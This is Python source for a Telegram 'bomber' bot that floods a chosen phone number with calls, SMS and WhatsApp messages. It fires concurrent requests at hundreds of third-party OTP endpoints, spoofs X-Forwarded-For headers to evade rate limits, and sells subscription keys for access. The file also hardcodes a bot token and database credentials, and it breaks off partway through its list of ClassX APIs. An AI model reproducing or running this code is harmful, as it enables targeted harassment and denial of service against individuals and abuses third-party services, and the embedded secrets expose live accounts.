#!/usr/bin/env python3
"""
🔥 CollBomber Telegram Bot — Ultra Fast Mode (Heroku Ready)
250+ APIs + 500+ ClassX APIs | Call + SMS + WhatsApp + Mix | PostgreSQL | Auto-Restart
"""

import telebot
from telebot import types
import requests
import threading
import time
import random
import uuid
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timedelta
import json
import hashlib
import os
import sys
import logging
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============================================================
# LOGGING
# ============================================================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger(__name__)

# ============================================================
# POSTGRESQL
# ============================================================
try:
    import psycopg2
    from psycopg2 import pool as pg_pool
    from psycopg2.extras import RealDictCursor
    import atexit
    PG_AVAILABLE = True
except ImportError:
    PG_AVAILABLE = False
    logger.warning("⚠️ psycopg2 not installed — PostgreSQL disabled")

DATABASE_URL = os.environ.get(
    "DATABASE_URL",
    "postgres://u2psmt0rtf487d:p3acf445162b293321536b849173a681d035468539eefea97c94f624746d179f3@c2m7qldd7t9j38.cluster-czrs8kj4isg7.us-east-1.rds.amazonaws.com:5432/dfkbivehqdd646"
)
if DATABASE_URL.startswith("postgres://"):
    DATABASE_URL = DATABASE_URL.replace("postgres://", "postgresql://", 1)

_pg_pool = None

def init_pg_pool():
    global _pg_pool
    if not PG_AVAILABLE:
        return None
    if _pg_pool is not None:
        return _pg_pool
    try:
        _pg_pool = pg_pool.SimpleConnectionPool(
            1, 10, dsn=DATABASE_URL, sslmode="require", connect_timeout=10
        )
        logger.info("✅ PostgreSQL pool initialized")
        return _pg_pool
    except Exception as e:
        logger.error(f"❌ PostgreSQL pool init failed: {e}")
        _pg_pool = None
        return None

def get_pg_conn():
    global _pg_pool
    if _pg_pool is None:
        init_pg_pool()
    if _pg_pool is None:
        return None
    try:
        return _pg_pool.getconn()
    except Exception as e:
        logger.error(f"PG getconn error: {e}")
        return None

def release_pg_conn(conn):
    if _pg_pool and conn:
        try:
            _pg_pool.putconn(conn)
        except Exception:
            pass

def close_pg_pool():
    global _pg_pool
    if _pg_pool:
        try:
            _pg_pool.closeall()
        except Exception:
            pass
        _pg_pool = None

if PG_AVAILABLE:
    atexit.register(close_pg_pool)

# ============================================================
# CONFIG
# ============================================================
API_TOKEN = os.environ.get("BOT_TOKEN") or os.environ.get("API_TOKEN")
if not API_TOKEN:
    try:
        from config_token import TOKEN as API_TOKEN
    except ImportError:
        API_TOKEN = "8603475566:AAHADiymgP_UH4D_ZdBL54D13PLLUOsSZ-8"

MAX_WORKERS = int(os.environ.get("MAX_WORKERS", 30))
SMS_MAX_WORKERS = int(os.environ.get("SMS_MAX_WORKERS", 50))
DELAY_BETWEEN_ROUNDS = float(os.environ.get("DELAY_BETWEEN_ROUNDS", 0.3))
SMS_DELAY_BETWEEN_ROUNDS = float(os.environ.get("SMS_DELAY_BETWEEN_ROUNDS", 0.1))
SMS_DOUBLE_FIRE = os.environ.get("SMS_DOUBLE_FIRE", "true").lower() == "true"
IMPORTANT_CALL_INTERVAL = 3
IMPORTANT_5S_INTERVAL = 3

_admin_env = os.environ.get("ADMIN_IDS", "8128821116")
ADMIN_IDS = [int(x.strip()) for x in _admin_env.split(",") if x.strip().isdigit()]
ADMIN_DB_PATH = os.environ.get("ADMIN_DB_PATH", "admin_db.json")
CUSTOM_APIS_PATH = "custom_apis.json"

REQUIRED_CHANNEL = os.environ.get("REQUIRED_CHANNEL", "@rolexxbomber")
CHANNEL_LINK = os.environ.get("CHANNEL_LINK", "https://t.me/rolexxbomber")
CHANNEL_CHECK_ENABLED = os.environ.get("CHANNEL_CHECK", "true").lower() == "true"

bot = telebot.TeleBot(API_TOKEN, threaded=True)

# ============================================================
# ADMIN DB
# ============================================================
class AdminDB:
    def __init__(self, db_path=ADMIN_DB_PATH):
        self.db_path = db_path
        self.lock = threading.Lock()
        self.use_pg = False
        self.data = self._load_json()
        self._init_pg()

    def _load_json(self):
        try:
            with open(self.db_path, 'r') as f:
                return json.load(f)
        except (FileNotFoundError, json.JSONDecodeError):
            return {
                "users": {}, "banned": [], "admins": [], "broadcasts": 0,
                "total_bombs": 0, "verified": [], "keys": {}, "subscriptions": {},
                "api_stats": {}, "premium_users": [], "admin_contacts": [],
                "contact_messages": {}
            }

    def _save_json(self):
        try:
            with open(self.db_path, "w") as f:
                json.dump(self.data, f, indent=2)
        except Exception as e:
            logger.error(f"DB save error: {e}")

    def _init_pg(self):
        if not PG_AVAILABLE:
            return
        conn = get_pg_conn()
        if not conn:
            logger.warning("⚠️ PG unavailable — using JSON fallback")
            return
        try:
            with conn.cursor() as cur:
                cur.execute("""CREATE TABLE IF NOT EXISTS users (
                    user_id TEXT PRIMARY KEY, username TEXT, first_seen TIMESTAMP,
                    phone TEXT, total_sessions INTEGER DEFAULT 0, total_hits INTEGER DEFAULT 0,
                    total_ok INTEGER DEFAULT 0, total_fail INTEGER DEFAULT 0,
                    total_rounds INTEGER DEFAULT 0, modes_used TEXT[] DEFAULT '{}',
                    last_active TIMESTAMP, last_phone TEXT, last_mode TEXT);""")
                cur.execute("""CREATE TABLE IF NOT EXISTS banned (
                    user_id TEXT PRIMARY KEY, banned_at TIMESTAMP DEFAULT NOW(), banned_by TEXT);""")
                cur.execute("""CREATE TABLE IF NOT EXISTS admins (
                    user_id TEXT PRIMARY KEY, added_by TEXT, added_at TIMESTAMP DEFAULT NOW());""")
                cur.execute("""CREATE TABLE IF NOT EXISTS verified (
                    user_id TEXT PRIMARY KEY, verified_at TIMESTAMP DEFAULT NOW());""")
                cur.execute("""CREATE TABLE IF NOT EXISTS subscriptions (
                    user_id TEXT PRIMARY KEY, plan TEXT, started_at TIMESTAMP,
                    expires_at TIMESTAMP, max_concurrent INTEGER DEFAULT 2,
                    max_hours INTEGER DEFAULT 8, price INTEGER DEFAULT 0,
                    active BOOLEAN DEFAULT TRUE);""")
                cur.execute("""CREATE TABLE IF NOT EXISTS keys (
                    key TEXT PRIMARY KEY, plan TEXT, days INTEGER, concurrent INTEGER,
                    max_hours INTEGER, price INTEGER, created_by TEXT, created_at TIMESTAMP,
                    used BOOLEAN DEFAULT FALSE, used_by TEXT, used_at TIMESTAMP,
                    expires_at TIMESTAMP);""")
                cur.execute("""CREATE TABLE IF NOT EXISTS api_stats (
                    api_name TEXT PRIMARY KEY, success INTEGER DEFAULT 0, fail INTEGER DEFAULT 0);""")
                cur.execute("""CREATE TABLE IF NOT EXISTS contact_messages (
                    id TEXT PRIMARY KEY, user_id TEXT, username TEXT, message TEXT,
                    timestamp TIMESTAMP, replied BOOLEAN DEFAULT FALSE, reply_text TEXT);""")
                cur.execute("""CREATE TABLE IF NOT EXISTS global_stats (
                    key TEXT PRIMARY KEY, value BIGINT DEFAULT 0);""")
                cur.execute("INSERT INTO global_stats(key, value) VALUES ('total_bombs', 0) ON CONFLICT (key) DO NOTHING;")
                conn.commit()
            self.use_pg = True
            logger.info("✅ PostgreSQL tables ready")
        except Exception as e:
            logger.error(f"❌ PG init error: {e}")
            self.use_pg = False
        finally:
            release_pg_conn(conn)

    def _exec(self, query, params=None, fetch=None):
        conn = get_pg_conn()
        if not conn:
            return None
        try:
            with conn.cursor(cursor_factory=RealDictCursor) as cur:
                cur.execute(query, params or ())
                result = None
                if fetch == "one":
                    result = cur.fetchone()
                elif fetch == "all":
                    result = cur.fetchall()
                conn.commit()
                return result
        except Exception as e:
            try:
                conn.rollback()
            except Exception:
                pass
            logger.error(f"PG exec error: {e} | query={str(query)[:80]}")
            return None
        finally:
            release_pg_conn(conn)

    def track_user(self, user_id, username, phone, mode):
        uid = str(user_id)
        if self.use_pg:
            self._exec("""
                INSERT INTO users (user_id, username, first_seen, phone, total_sessions,
                                   modes_used, last_active, last_phone, last_mode)
                VALUES (%s, %s, NOW(), %s, 1, ARRAY[%s], NOW(), %s, %s)
                ON CONFLICT (user_id) DO UPDATE SET
                    username = COALESCE(EXCLUDED.username, users.username),
                    last_active = NOW(), last_phone = EXCLUDED.last_phone,
                    last_mode = EXCLUDED.last_mode,
                    total_sessions = users.total_sessions + 1, phone = EXCLUDED.phone,
                    modes_used = (SELECT ARRAY(SELECT DISTINCT unnest(users.modes_used || EXCLUDED.modes_used)));
            """, (uid, username, phone, mode, phone, mode))
        else:
            with self.lock:
                if uid not in self.data["users"]:
                    self.data["users"][uid] = {
                        "username": username or "Unknown",
                        "first_seen": datetime.now().isoformat(),
                        "phone": phone, "total_sessions": 0, "total_hits": 0,
                        "total_ok": 0, "total_fail": 0, "total_rounds": 0,
                        "modes_used": [], "last_active": datetime.now().isoformat(),
                        "last_phone": phone, "last_mode": mode
                    }
                u = self.data["users"][uid]
                u["last_active"] = datetime.now().isoformat()
                u["last_phone"] = phone
                u["last_mode"] = mode
                u["total_sessions"] += 1
                if mode not in u["modes_used"]:
                    u["modes_used"].append(mode)
                u["username"] = username or u["username"]
                self._save_json()

    def update_stats(self, user_id, ok, fail, rounds, total):
        uid = str(user_id)
        if self.use_pg:
            self._exec("""UPDATE users SET total_hits = total_hits + %s,
                          total_ok = total_ok + %s, total_fail = total_fail + %s,
                          total_rounds = total_rounds + %s, last_active = NOW()
                          WHERE user_id = %s;""", (total, ok, fail, rounds, uid))
            self._exec("UPDATE global_stats SET value = value + %s WHERE key = 'total_bombs';", (total,))
        else:
            with self.lock:
                if uid in self.data["users"]:
                    u = self.data["users"][uid]
                    u["total_hits"] += total
                    u["total_ok"] += ok
                    u["total_fail"] += fail
                    u["total_rounds"] += rounds
                    u["last_active"] = datetime.now().isoformat()
                    self.data["total_bombs"] += total
                    self._save_json()

    def is_banned(self, user_id):
        uid = str(user_id)
        if self.use_pg:
            return self._exec("SELECT 1 FROM banned WHERE user_id = %s;", (uid,), fetch="one") is not None
        with self.lock:
            return uid in self.data.get("banned", [])

    def is_admin(self, user_id):
        if user_id in ADMIN_IDS:
            return True
        uid = str(user_id)
        if self.use_pg:
            return self._exec("SELECT 1 FROM admins WHERE user_id = %s;", (uid,), fetch="one") is not None
        with self.lock:
            return uid in self.data.get("admins", [])

    def ban_user(self, user_id, admin_id):
        uid = str(user_id)
        if self.use_pg:
            self._exec("INSERT INTO banned(user_id, banned_by) VALUES (%s, %s) ON CONFLICT DO NOTHING;",
                       (uid, str(admin_id)))
            return True
        with self.lock:
            if uid not in self.data["banned"]:
                self.data["banned"].append(uid)
                self._save_json()
                return True
            return False

    def unban_user(self, user_id, admin_id):
        uid = str(user_id)
        if self.use_pg:
            self._exec("DELETE FROM banned WHERE user_id = %s;", (uid,))
            return True
        with self.lock:
            if uid in self.data["banned"]:
                self.data["banned"].remove(uid)
                self._save_json()
                return True
            return False

    def get_banned_list(self):
        if self.use_pg:
            rows = self._exec("SELECT user_id FROM banned;", fetch="all") or []
            return [r["user_id"] for r in rows]
        with self.lock:
            return list(self.data.get("banned", []))

    def add_admin(self, user_id, added_by):
        uid = str(user_id)
        if self.use_pg:
            self._exec("INSERT INTO admins(user_id, added_by) VALUES (%s, %s) ON CONFLICT DO NOTHING;",
                       (uid, str(added_by)))
            return True
        with self.lock:
            if uid not in self.data["admins"]:
                self.data["admins"].append(uid)
                self._save_json()
                return True
            return False

    def remove_admin(self, user_id):
        uid = str(user_id)
        if self.use_pg:
            self._exec("DELETE FROM admins WHERE user_id = %s;", (uid,))
            return True
        with self.lock:
            if uid in self.data["admins"]:
                self.data["admins"].remove(uid)
                self._save_json()
                return True
            return False

    def get_all_users(self):
        if self.use_pg:
            rows = self._exec("SELECT * FROM users;", fetch="all") or []
            return {r["user_id"]: r for r in rows}
        with self.lock:
            return dict(self.data["users"])

    def get_user_count(self):
        if self.use_pg:
            r = self._exec("SELECT COUNT(*) AS c FROM users;", fetch="one")
            return r["c"] if r else 0
        with self.lock:
            return len(self.data["users"])

    def get_banned_count(self):
        if self.use_pg:
            r = self._exec("SELECT COUNT(*) AS c FROM banned;", fetch="one")
            return r["c"] if r else 0
        with self.lock:
            return len(self.data.get("banned", []))

    def get_total_bombs(self):
        if self.use_pg:
            r = self._exec("SELECT value FROM global_stats WHERE key = 'total_bombs';", fetch="one")
            return int(r["value"]) if r else 0
        with self.lock:
            return self.data.get("total_bombs", 0)

    def verify_user(self, user_id):
        uid = str(user_id)
        if self.use_pg:
            self._exec("INSERT INTO verified(user_id) VALUES (%s) ON CONFLICT DO NOTHING;", (uid,))
            return True
        with self.lock:
            if uid not in self.data.get("verified", []):
                self.data.setdefault("verified", []).append(uid)
                self._save_json()
                return True
            return False

    def is_verified(self, user_id):
        uid = str(user_id)
        if self.use_pg:
            return self._exec("SELECT 1 FROM verified WHERE user_id = %s;", (uid,), fetch="one") is not None
        with self.lock:
            return uid in self.data.get("verified", [])

    def generate_key(self, plan, created_by, custom_days=None):
        raw = f"{plan}_{uuid.uuid4().hex}_{time.time()}_{random.randint(1000,9999)}"
        key = hashlib.md5(raw.encode()).hexdigest()[:16].upper()
        key = "-".join([key[i:i+4] for i in range(0, 16, 4)])
        plan_config = {
            "daily": {"days": 1, "concurrent": 2, "hours": 2, "price": 40},
            "monthly": {"days": 30, "concurrent": 2, "hours": 8, "price": 199},
            "3month": {"days": 90, "concurrent": 3, "hours": 24, "price": 499},
            "custom": {"days": custom_days or 30, "concurrent": 5, "hours": 24, "price": 0},
        }
        cfg = plan_config["custom"] if (custom_days and plan == "custom") else plan_config.get(plan, plan_config["monthly"])
        if custom_days and plan == "custom":
            cfg["days"] = custom_days

        if self.use_pg:
            self._exec("""INSERT INTO keys(key, plan, days, concurrent, max_hours, price,
                          created_by, created_at, used)
                          VALUES (%s, %s, %s, %s, %s, %s, %s, NOW(), FALSE);""",
                       (key, plan, cfg["days"], cfg["concurrent"], cfg["hours"], cfg["price"], str(created_by)))
        else:
            with self.lock:
                self.data.setdefault("keys", {})
                self.data["keys"][key] = {
                    "plan": plan, "days": cfg["days"], "concurrent": cfg["concurrent"],
                    "max_hours": cfg["hours"], "price": cfg["price"],
                    "created_by": str(created_by), "created_at": datetime.now().isoformat(),
                    "used": False, "used_by": None, "used_at": None, "expires_at": None
                }
                self._save_json()
        return key

    def redeem_key(self, key, user_id):
        uid = str(user_id)
        if self.use_pg:
            row = self._exec("SELECT * FROM keys WHERE key = %s;", (key,), fetch="one")
            if not row:
                return False, "❌ Invalid key!"
            if row["used"]:
                return False, "❌ Yeh key already used ho chuki hai!"
            now = datetime.now()
            days = row["days"]
            expires = (now.replace(year=now.year + 50)) if days >= 99999 else (now + timedelta(days=days))
            self._exec("""INSERT INTO subscriptions(user_id, plan, started_at, expires_at,
                          max_concurrent, max_hours, price, active)
                          VALUES (%s, %s, NOW(), %s, %s, %s, %s, TRUE)
                          ON CONFLICT (user_id) DO UPDATE SET
                              plan = EXCLUDED.plan, started_at = EXCLUDED.started_at,
                              expires_at = EXCLUDED.expires_at,
                              max_concurrent = EXCLUDED.max_concurrent,
                              max_hours = EXCLUDED.max_hours,
                              price = EXCLUDED.price, active = TRUE;""",
                       (uid, row["plan"], expires, row["concurrent"], row["max_hours"], row["price"]))
            self._exec("UPDATE keys SET used = TRUE, used_by = %s, used_at = NOW() WHERE key = %s;", (uid, key))
            return True, (f"✅ *Plan Activated!*\n\n🎯 Plan: {row['plan'].upper()}\n"
                          f"⏱ Duration: {days} days\n⚡ Concurrent: {row['concurrent']}\n"
                          f"⏰ Max Hours: {row['max_hours']}h")
        else:
            with self.lock:
                self.data.setdefault("keys", {})
                self.data.setdefault("subscriptions", {})
                if key not in self.data["keys"]:
                    return False, "❌ Invalid key!"
                k = self.data["keys"][key]
                if k["used"]:
                    return False, "❌ Yeh key already used ho chuki hai!"
                now = datetime.now()
                expires = (now.replace(year=now.year + 50)).isoformat() if k["days"] >= 99999 else (now + timedelta(days=k["days"])).isoformat()
                self.data["subscriptions"][uid] = {
                    "plan": k["plan"], "started_at": now.isoformat(),
                    "expires_at": expires, "max_concurrent": k["concurrent"],
                    "max_hours": k["max_hours"], "price": k["price"], "active": True
                }
                if uid not in self.data.get("premium_users", []):
                    self.data.setdefault("premium_users", []).append(uid)
                k["used"] = True
                k["used_by"] = uid
                k["used_at"] = now.isoformat()
                self._save_json()
                return True, (f"✅ *Plan Activated!*\n\n🎯 Plan: {k['plan'].upper()}\n"
                              f"⏱ Duration: {k['days']} days\n⚡ Concurrent: {k['concurrent']}\n"
                              f"⏰ Max Hours: {k['max_hours']}h")

    def get_subscription(self, user_id):
        uid = str(user_id)
        if self.use_pg:
            row = self._exec("SELECT * FROM subscriptions WHERE user_id = %s;", (uid,), fetch="one")
            if not row:
                return None
            if row.get("expires_at") and row["expires_at"] < datetime.now():
                self._exec("UPDATE subscriptions SET active = FALSE WHERE user_id = %s;", (uid,))
                return None
            return dict(row)
        with self.lock:
            sub = self.data.get("subscriptions", {}).get(uid)
            if not sub:
                return None
            if sub.get("expires_at"):
                try:
                    expires = datetime.fromisoformat(sub["expires_at"])
                    if datetime.now() > expires:
                        sub["active"] = False
                        self._save_json()
                        return None
                except Exception:
                    pass
            return sub

    def get_all_keys(self):
        if self.use_pg:
            rows = self._exec("SELECT * FROM keys;", fetch="all") or []
            return {r["key"]: r for r in rows}
        with self.lock:
            return dict(self.data.get("keys", {}))

    def get_premium_users(self):
        if self.use_pg:
            rows = self._exec("SELECT user_id FROM subscriptions WHERE active = TRUE;", fetch="all") or []
            return [r["user_id"] for r in rows]
        with self.lock:
            return list(self.data.get("premium_users", []))

    def get_premium_count(self):
        if self.use_pg:
            r = self._exec("SELECT COUNT(*) AS c FROM subscriptions WHERE active = TRUE AND expires_at > NOW();", fetch="one")
            return r["c"] if r else 0
        with self.lock:
            count = 0
            for uid in self.data.get("premium_users", []):
                sub = self.data.get("subscriptions", {}).get(uid)
                if sub and sub.get("active", True):
                    if sub.get("expires_at"):
                        try:
                            if datetime.now() < datetime.fromisoformat(sub["expires_at"]):
                                count += 1
                        except Exception:
                            count += 1
                    else:
                        count += 1
            return count

    def give_premium(self, user_id, days=30, plan="custom"):
        uid = str(user_id)
        expires = datetime.now() + timedelta(days=days)
        if self.use_pg:
            self._exec("""INSERT INTO subscriptions(user_id, plan, started_at, expires_at,
                          max_concurrent, max_hours, price, active)
                          VALUES (%s, %s, NOW(), %s, 5, 24, 0, TRUE)
                          ON CONFLICT (user_id) DO UPDATE SET
                              plan = EXCLUDED.plan, started_at = EXCLUDED.started_at,
                              expires_at = EXCLUDED.expires_at, active = TRUE;""",
                       (uid, plan, expires))
            return True
        with self.lock:
            self.data.setdefault("subscriptions", {})
            self.data.setdefault("premium_users", [])
            self.data["subscriptions"][uid] = {
                "plan": plan, "started_at": datetime.now().isoformat(),
                "expires_at": expires.isoformat(), "max_concurrent": 5,
                "max_hours": 24, "price": 0, "active": True
            }
            if uid not in self.data["premium_users"]:
                self.data["premium_users"].append(uid)
            self._save_json()
            return True

    def remove_premium(self, user_id):
        uid = str(user_id)
        if self.use_pg:
            self._exec("DELETE FROM subscriptions WHERE user_id = %s;", (uid,))
            return True
        with self.lock:
            removed = False
            if uid in self.data.get("premium_users", []):
                self.data["premium_users"].remove(uid)
                removed = True
            if uid in self.data.get("subscriptions", {}):
                del self.data["subscriptions"][uid]
                removed = True
            self._save_json()
            return removed

    def update_api_stats(self, api_name, success):
        if self.use_pg:
            if success:
                self._exec("""INSERT INTO api_stats(api_name, success, fail) VALUES (%s, 1, 0)
                              ON CONFLICT (api_name) DO UPDATE SET success = api_stats.success + 1;""", (api_name,))
            else:
                self._exec("""INSERT INTO api_stats(api_name, success, fail) VALUES (%s, 0, 1)
                              ON CONFLICT (api_name) DO UPDATE SET fail = api_stats.fail + 1;""", (api_name,))
        else:
            with self.lock:
                stats = self.data.setdefault("api_stats", {})
                if api_name not in stats:
                    stats[api_name] = {"success": 0, "fail": 0}
                if success:
                    stats[api_name]["success"] += 1
                else:
                    stats[api_name]["fail"] += 1

    def get_api_stats(self):
        if self.use_pg:
            rows = self._exec("SELECT api_name, success, fail FROM api_stats;", fetch="all") or []
            return {r["api_name"]: {"success": r["success"], "fail": r["fail"]} for r in rows}
        with self.lock:
            return self.data.get("api_stats", {})

    def add_contact_message(self, user_id, username, message):
        msg_id = uuid.uuid4().hex[:10]
        if self.use_pg:
            self._exec("""INSERT INTO contact_messages(id, user_id, username, message, timestamp, replied)
                          VALUES (%s, %s, %s, %s, NOW(), FALSE);""",
                       (msg_id, str(user_id), username, message))
        else:
            with self.lock:
                self.data.setdefault("contact_messages", {})
                self.data["contact_messages"][msg_id] = {
                    "id": msg_id, "user_id": str(user_id),
                    "username": username or "Unknown", "message": message,
                    "timestamp": datetime.now().isoformat(),
                    "replied": False, "reply_text": None
                }
                self._save_json()
        return msg_id

    def get_contact_message(self, msg_id):
        if self.use_pg:
            return self._exec("SELECT * FROM contact_messages WHERE id = %s;", (str(msg_id),), fetch="one")
        with self.lock:
            return self.data.get("contact_messages", {}).get(str(msg_id))

    def mark_replied(self, msg_id, reply_text):
        if self.use_pg:
            self._exec("UPDATE contact_messages SET replied = TRUE, reply_text = %s WHERE id = %s;",
                       (reply_text, str(msg_id)))
            return True
        with self.lock:
            if str(msg_id) in self.data.get("contact_messages", {}):
                self.data["contact_messages"][str(msg_id)]["replied"] = True
                self.data["contact_messages"][str(msg_id)]["reply_text"] = reply_text
                self._save_json()
                return True
            return False

    def get_pending_contacts(self):
        if self.use_pg:
            rows = self._exec("SELECT * FROM contact_messages WHERE replied = FALSE;", fetch="all") or []
            return [dict(r) for r in rows]
        with self.lock:
            pending = []
            for mid, msg in self.data.get("contact_messages", {}).items():
                if not msg.get("replied"):
                    pending.append(msg)
            return pending

admin_db = AdminDB()

# ============================================================
# CUSTOM API STORAGE
# ============================================================
class CustomAPIDB:
    def __init__(self, path=CUSTOM_APIS_PATH):
        self.path = path
        self.lock = threading.Lock()
        self.data = self._load()

    def _load(self):
        try:
            with open(self.path, 'r') as f:
                return json.load(f)
        except (FileNotFoundError, json.JSONDecodeError):
            return {"apis": []}

    def _save(self):
        try:
            with open(self.path, "w") as f:
                json.dump(self.data, f, indent=2)
        except Exception as e:
            logger.error(f"Custom API save error: {e}")

    def add_api(self, name, url, method, headers, body, category):
        with self.lock:
            self.data["apis"].append({
                "name": name, "url": url, "method": method.upper(),
                "headers": headers or {}, "body": body, "category": category,
                "added_at": datetime.now().isoformat()
            })
            self._save()
            return True

    def remove_api(self, name):
        with self.lock:
            before = len(self.data["apis"])
            self.data["apis"] = [a for a in self.data["apis"] if a["name"] != name]
            after = len(self.data["apis"])
            self._save()
            return before != after

    def get_all(self):
        with self.lock:
            return list(self.data["apis"])

    def count(self):
        with self.lock:
            return len(self.data["apis"])

custom_api_db = CustomAPIDB()

# ============================================================
# API CONFIG CLASS
# ============================================================
class ApiConfig:
    def __init__(self, name, url, method="GET", headers=None, body=None, category="sms", delay_ms=0):
        self.name = name
        self.url = url
        self.method = method
        self.headers = headers or {"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"}
        self.body = body
        self.category = category
        self.delay_ms = delay_ms

    def build_request(self, phone, duration=3):
        ts = str(int(time.time() * 1000))
        rand_id = uuid.uuid4().hex[:8]
        uid = uuid.uuid4().hex
        md5 = uid.replace("-", "")[:32]
        random_pan = random.choice(["ABCDE1234F", "GDODJ5434B", "GSISB5468H", "HSOSN5464B",
                                     "FUOUR2389B", "VUJVU5675H", "TSISV5434B"])
        final_url = self.url
        for key, val in [("{phone}", phone), ("{number}", phone), ("{duration}", str(duration)),
                         ("{timestamp}", ts), ("{random_md5}", md5), ("{uuid}", uid),
                         ("{random_id}", rand_id), ("{random_pan}", random_pan)]:
            final_url = final_url.replace(key, val)
        headers = dict(self.headers)
        if "X-Forwarded-For" not in headers and "Client-IP" not in headers:
            spoof = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            headers["X-Forwarded-For"] = spoof
            headers["Client-IP"] = spoof
        body = self.body
        if body:
            for key, val in [("{phone}", phone), ("{number}", phone), ("{duration}", str(duration)),
                             ("{timestamp}", ts), ("{random_md5}", md5), ("{uuid}", uid),
                             ("{random_id}", rand_id), ("{random_pan}", random_pan)]:
                body = body.replace(key, val)
        return final_url, headers, body

# ============================================================
# CLASSX APIS (500+)
# ============================================================
CLASSX_APIS = [
    ("A4Agricos", "https://a4agricosapi.classx.co.in"),
    ("A4Shub", "https://a4shubapi.classx.co.in"),
    ("Aacharyaayurveda", "https://aacharyaayurvedaapi.classx.co.in"),
    ("Aadarshonlineeducation", "https://aadarshonlineeducationapi.classx.co.in"),
    ("Aadharclasses", "https://aadharclassesjhunjhunuapi.classx.co.in"),
    ("Aadiwasikritisamiti", "https://aadiwasikritisamitiapi.classx.co.in"),
    ("Aagaazinstitution", "https://aagaazinstitutionapi.classx.co.in"),
    ("Aagamclasses", "https://aagamclassesapi.classx.co.in"),
    ("Aakarlearningapp", "https://aakarlearningapi.classx.co.in"),
    ("Aakartutorials", "https://aakartutorialsapi.classx.co.in"),
    ("Aakashkrishnaacademy", "https://aakashkrishnaacademyapi.classx.co.in"),
    ("Aalphaglobalinstitute", "https://aalphaglobalinstituteapi.classx.co.in"),
    ("Aaonlinesolution", "https://aaonlinesolutionapi.classx.co.in"),
    ("Aapkipathshala", "https://aapkipathshalaapi.classx.co.in"),
    ("Aapnipadhai", "https://aapnipadhaiapi.classx.co.in"),
    ("Aarambhacademy", "https://aarambhacademyapi.classx.co.in"),
    ("Aarambhvidyapith", "https://aarambhvidyapithapi.classx.co.in"),
    ("Aarohacademy", "https://aarohacademyapi.classx.co.in"),
    ("Aash", "https://aashapi.appx.co.in"),
    ("Aasthabhavthramayan", "https://aasthabhavathramayanapi.classx.co.in"),
    ("Aatmnirmanacademy", "https://aatmnirmanacademyapi.classx.co.in"),
    ("Abhigyaias", "https://abhigyaiasapi.classx.co.in"),
    ("Abhimanyuacademyindore", "https://abhimanyuacademyindoreapi.classx.co.in"),
    ("Abhinanadanclasseskotputali", "https://abhinanadanclasseskotputaliapi.classx.co.in"),
    ("Abhinavmotordrivingschoolapp", "https://abhinavmotordrivingschoolapi.classx.co.in"),
    ("Abhishektehanguriyaclasses", "https://abhishektehanguriyaclassesapi.classx.co.in"),
    ("Abhiyaanacademyforiasips", "https://abhiyaanacademyiasipsapi.classx.co.in"),
    ("Abhyaasagriacademy", "https://abhyaasagriacademyapi.classx.co.in"),
    ("Abhyaasagriacademy20", "https://abhyaasagriacademy20api.classx.co.in"),
    ("Abhyasa", "https://abhyasaapi.classx.co.in"),
    ("Abhyasmitra", "https://abhyasmitraapi.classx.co.in"),
    ("Abjeetenge", "https://abjeetengeapi.classx.co.in"),
    ("Ablazeacademy", "https://ablazeacademyapi.classx.co.in"),
    ("Abplearning", "https://abplearningapi.classx.co.in"),
    ("Academiczoneclassbuddy", "https://academiczoneapi.classx.co.in"),
    ("Academiyaofficialliveclassesquizpdf", "https://academiyaofficialapi.classx.co.in"),
    ("Academy99Byanoopjain", "https://academyanoopjainapi.classx.co.in"),
    ("Academycommerce", "https://academycommerceapi.classx.co.in"),
    ("Academyofclinicalresearch", "https://academyclinicalresearchapi.classx.co.in"),
    ("Acewithease", "https://acewitheaseapi.classx.co.in"),
    ("Acfofficial", "https://acfofficialapi.classx.co.in"),
    ("Acharyakulambiharnaveensir", "https://acharyakulambiharnaveenapi.classx.co.in"),
    ("Achievecapf", "https://achievecapfapi.classx.co.in"),
    ("Achiever", "https://achieversacademyapi.appx.co.in"),
    ("Achieverpoint", "https://achieverpointapi.classx.co.in"),
    ("Achieversacademy", "https://achieversacademyapi.classx.co.in"),
    ("Achieversadda247", "https://achieversadda247api.classx.co.in"),
    ("Achiverseducation", "https://achiverseducationapi.classx.co.in"),
    ("Aclasseducation", "https://aclasseducationapi.classx.co.in"),
    ("Acmecommerceclasses", "https://acmecommerceclassesapi.classx.co.in"),
    ("Acracademy", "https://acracademyapi.classx.co.in"),
    ("Adarmypoint", "https://adarmypointapi.classx.co.in"),
    ("Adarshacademys20", "https://adarshacademyapi.classx.co.in"),
    ("Adarshiasacademy", "https://adarshiasacademyapi.classx.co.in"),
    ("Adconcept", "https://adconceptapi.classx.co.in"),
    ("Adhigamclassesjaipur", "https://adhigamclassesjaipurapi.classx.co.in"),
    ("Adhijayclasses", "https://adhijayclassesapi.classx.co.in"),
    ("Adhyayan", "https://adhyayanmantraapi.appx.co.in"),
    ("Adhyayankendra", "https://adhyayankendraapi.classx.co.in"),
    ("Adinarayanaacademy2", "https://adinarayanaacademytwoapi.classx.co.in"),
    ("Adityanareshmathsclasses", "https://adityanareshmathsclassesapi.classx.co.in"),
    ("Adityaschoolofbanking", "https://adityaschoolbankingapi.classx.co.in"),
    ("Adlive", "https://adliveapi.classx.co.in"),
    ("Advancempsc", "https://advancempscapi.classx.co.in"),
    ("Agastyasacademy", "https://agastyasacademyapi.classx.co.in"),
    ("Agentsuvidha", "https://agentsuvidhaapi.classx.co.in"),
    ("Agkrishnaspokenhindi", "https://agkrishnaspokenhindiapi.classx.co.in"),
    ("Agnihotriclasses", "https://agnihotriclassesapi.classx.co.in"),
    ("Agnitutor", "https://agnitutorapi.classx.co.in"),
    ("Agniveerguruji", "https://agniveergurujiapi.classx.co.in"),
    ("Agniveerstudyarmynavyairforce", "https://agniveerstudyarmynavyairforceapi.classx.co.in"),
    ("Agogeclassesacharyagram", "https://agogeclassesapi.classx.co.in"),
    ("Agradeclasses", "https://agradeclassesapi.classx.co.in"),
    ("Agriacademyhisar", "https://agriacademyhisarapi.classx.co.in"),
    ("Agriaware", "https://agriawareapi.classx.co.in"),
    ("Agricoaching_appx", "https://agricoachingapi.appx.co.in"),
